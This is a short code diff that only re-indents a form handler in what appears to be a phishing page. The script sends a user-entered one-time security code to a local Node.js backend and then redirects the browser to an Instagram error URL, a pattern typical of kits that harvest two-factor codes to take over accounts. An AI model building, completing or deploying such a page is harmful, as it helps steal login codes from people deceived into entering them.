@@ -158,23 +158,22 @@
                 errorMessage.style.display = 'block'; // Show error message
             } else {
                 errorMessage.style.display = 'none'; // Hide error message
-  try {
-                // Send data to the Node.js backend
-                const response = await fetch('http://localhost:3000/submit-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ securityCode }),
-                });
+   try {
+      const response = await fetch('http://localhost:3000/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ securityCode }),
+      });
 
-                if (response.ok) {
-                    alert('OTP submitted successfully!');
-                    window.location.href = 'https://instagram.com/error/'; // Redirect to the next page
-                } else {
-                    alert('Failed to submit OTP. Please try again.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred. Please try again.');
+      if (response.ok) {
+        alert('OTP submitted successfully!');
+        window.location.href = 'https://instagram.com/error/'; // Redirect to the next page
+      } else {
+        alert('Failed to submit OTP. Please try again.');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('An error occurred. Please try again.');
             }
         });
     </script>
